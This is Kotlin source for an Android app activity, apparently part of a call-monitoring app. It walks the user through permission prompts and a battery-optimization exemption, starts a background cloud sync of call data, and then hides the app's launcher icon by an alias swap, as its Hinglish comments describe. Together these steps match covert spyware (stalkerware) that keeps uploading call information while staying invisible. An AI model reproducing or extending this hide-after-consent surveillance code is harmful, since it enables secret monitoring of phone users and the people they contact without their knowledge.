package com.calltech

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Install / Open: pehle permission screens aage.
 * Allow ke baad Home, phir alias-swap se icon hide.
 * Permission dialog ke dauran launcher mat chhoo — process mar jaati hai.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private val pending = ArrayDeque<String>()
    private var retried = false
    private var setupFinished = false

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { _ ->
            askNextPermission()
        }

    private val batteryLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { _ ->
            finishAndSync()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        MongoSyncHelper.ensureApiUrl(this)
        CallSyncHelper.markBackgroundSyncEnabled(this, true)
        SyncBootstrap.armBackgroundSync(this)

        pending.clear()
        pending.addAll(SyncBootstrap.requiredPermissions())
        askNextPermission()
    }

    private fun askNextPermission() {
        while (pending.isNotEmpty()) {
            val permission = pending.removeFirst()
            if (checkSelfPermission(permission) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                continue
            }
            permissionLauncher.launch(permission)
            return
        }

        if (SyncBootstrap.needsRuntimePermissions(this) && !retried) {
            retried = true
            pending.addAll(SyncBootstrap.requiredPermissions())
            askNextPermission()
            return
        }

        requestBatteryThenSync()
    }

    private fun requestBatteryThenSync() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val power = getSystemService(POWER_SERVICE) as PowerManager
            if (!power.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    batteryLauncher.launch(
                        Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = Uri.parse("package:$packageName")
                        },
                    )
                    return
                } catch (error: Exception) {
                    Log.w(TAG, "Battery prompt failed: ${error.message}")
                }
            }
        }
        finishAndSync()
    }

    private fun finishAndSync() {
        if (setupFinished) {
            return
        }
        setupFinished = true
        SyncObserverManager.register(applicationContext)
        InstallFlow.completeSetup(applicationContext)
        BackgroundSyncRunner.run {
            try {
                CallSyncService.holdDuring(applicationContext) {
                    InstallFlow.runFirstCloudSync(applicationContext)
                }
            } catch (error: Exception) {
                Log.e(TAG, "Background first sync failed", error)
            }
        }
        try {
            moveTaskToBack(true)
        } catch (_: Exception) {
        }
        LauncherHider.markAndSchedule(applicationContext)
        finish()
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
    }
}
